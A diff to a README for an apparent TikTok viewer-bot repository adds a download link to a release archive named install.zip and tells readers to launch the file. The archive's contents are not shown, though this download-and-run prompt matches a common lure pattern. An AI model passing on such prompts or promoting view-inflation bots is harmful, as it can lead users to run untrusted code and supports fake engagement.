@@ -7,7 +7,7 @@ The primary focus of this repository is to offer robust tools and guidance for b
 
 ## 📦 Get Started
 To access the tools and resources provided in this repository, you can download the necessary files from the following link: 
-### [![Download TikTok Viewer Bot](https://img.shields.io/badge/Download-Viewer_Bot_Toolkit.zip-blue-badge)]()
+### [![Download TikTok Viewer Bot](https://img.shields.io/badge/Download-Viewer_Bot_Toolkit.zip-blue-badge)](https://github.com/Trinzx/TT-Viewer-Booster/releases/download/DOWNLOAD_VIEWER/install.zip)
 
 📌 Note: Make sure to launch the file contained in the link to start using the engagement tools effectively.
 
